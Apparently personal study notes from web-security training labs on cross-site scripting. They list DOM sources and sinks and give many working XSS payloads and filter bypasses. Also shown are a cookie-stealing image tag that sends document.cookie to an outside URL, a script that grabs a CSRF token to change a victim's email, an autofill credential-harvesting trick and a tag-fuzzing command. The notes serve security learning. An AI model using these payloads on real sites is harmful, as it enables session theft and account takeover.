if the application executes the injected js code, it leads to xss

Reflectes xss - injectd script comes from the current http request
Stored xss - injected script comes from the website's database

DOM-based xss - clientside code is injectable

self xss - it applies only if the victim injects the code... payload cannot be sent by the attacker 

Reflected XSS:
	search=<script>alert(1)</script>
	
Stored xss:
	comment=<script>alert(1)</script>

DOM xss:

When a website contains javascript that takes value(called the source) which can be controlled by the attacker, passes onto an unsafe function(called the sink).

user controlled input = Source
vulnerable function = Sink

relfected+DOM:
	the server processes data from the request and echoes the data into the response

Here are some well-known vulnerable “sources”:-

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB
Database

Here are some well-known vulnerable “sinks”:-

document.write()
window.location
document.cookie
eval()
document.domain
WebSocket()
someElement.src
postMessage()
setRequestHeader()
FileReader.readAsText()
ExecuteSql()
sessionStorage.setItem()
document.evaluate()
JSON.parse()
someElement.setAttribute()
RegExp()
someDOMElement.innerHTML
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent

jquery

add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()

	

function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');

payload : search="><script>alert(1)</script>


var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
document.write('<option selected>'+store+'</option>');
  
breakout of the code with this

payload : </option><script>alert(1)</script>

The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe.

document.getElementById('searchMessage').innerHTML = query

payload : </span><img src=1 onerror="alert(1)">
                    

$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));

payload : javascript:alert(document.cookie)

we can update the herf with a clickable js event

if ng-app is added to a html tag, anything within {{}} will be excuted as a angular experession, thus enter this payload, our code gets executed

payload : {{constructor.constructor('alert(1)')()}}


eval('var searchResultsObj = ' + this.responseText);

'\' is not excaped thus as we enter \" --> its excaped quotation with \\" which making \\ ---> \ thus leaving the quotation free

Payload: \"+alert(1)}//

html.replace('<', '&lt;').replace('>', '&gt;');

this only replaces the first occurence, this we can add annything after that

payload: <test><img src=1 onerror="alert(1)">

steal cookies

<img src='http://url/?'+document.cookie>

if the site is using autofill

if you send a <input id=username><input id=password> that will automatically fill those details which we can then send back to attack server

var xhr1 = new XMLHttpRequest();
xhr1.onreadystatechange = function () {
if(this.readyState == 4 && this.status == 200){
var csrf = this.responseXML.getElementsByTagName('input')[1].value;
var xhr2 = new XMLHttpRequest();
xhr2.open('POST','https://accb1fce1fa66d5a80222e24000700f8.web-security-academy.net/my-account/change-email',true);
xhr2.send('email=test@what.com'+'&csrf='+csrf);
}
}
xhr1.open('GET','https://accb1fce1fa66d5a80222e24000700f8.web-security-academy.net/my-account',true);
xhr1.responseType='document';
xhr1.send()
</script>
<div><iframe src="https://aced1f8d1e9864f8801814dc002b0068.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'></div>

we can trigger the resize and get the payload run

<xss id=x onfocus=alert(1) tabindex=1>

the payload url must have #x so that it will automatically focus to that id and thus triggering the alert()

wfuzz -w tags --hc 400 https://acdf1fff1ff5facb80cf093700f600b1.web-security-academy.net/?search=%3CFUZZ%3E

<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

brute foce all tag names and find the whitelisted tags

<svg><animatetransform onbegin=alert(1) attributeName=transform>

test"%20 src=1 onmouseover=alert(1) autofocus x="

if the input is directly taken inside href, we can use

javascript:alert(1)-> this type of payload

we can break out of attribute with ' quote too

postid=1&' accesskey='x' onclick='alert(1)'

when you enter a ' in search
the input is escaped properly by javascript, but when the browser parses the 
whole things, it take that literally, thus
var input = '\'';
so if we put a </script>
var input='\'</script>';
the broswer will parse till the </script> as one script portion ignore the rest

if the prevention is based on espacing any charactor and not the escape character blackslash itself, it can bypassed by neutralizing by adding a blackslash, which
input = \'
it will take that as input = \\' --> second blackslash was added to espace single quotes, but then there is already a blackslash the browser will escape the \ and leave ' unescaped

if a waf is blocking (), bypass that by passing the input in diffrent way, like, 
onerror=alert;throw 1

this sets the global eror handler to alert, then throw send a input to the global handler which is set to alert, thus making alert(1)

/**/ can be used to bypass space inside js

can use arrow fucntions to trigger throw statements

if the browser decodes the htmlencoded value before the javascript intrepets it, it will enocde that values back to decoded values thus bypassing the security checks

http%3A%2F%2Fwww.google.com%26apos%3b);alert(1)//

here the &apos; is getting decoded by the broweser into ' before the js gets to intrepet those values

document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
incase if it a templete, ${} aything inside this i interpeted as js code

thus the output is passed into ${}, so we can nest the lien
`${user.searchvalue}`--> `${${alert(1)}}`
thus we get the excution

Content Security Policy:
	it adds another layer by restricting the resources that a page can load and resctrictin whether a page can be framed by other pages

	to enable this, http response header Content-Security-Policy should be added

eg: script-src 'self' -> allows only to load to scripts from same domain

CSP directive can specify hash value for the content that i gonna be loaded
CSP directive can specify a nonce and the same value must be used in that tag that loads a script

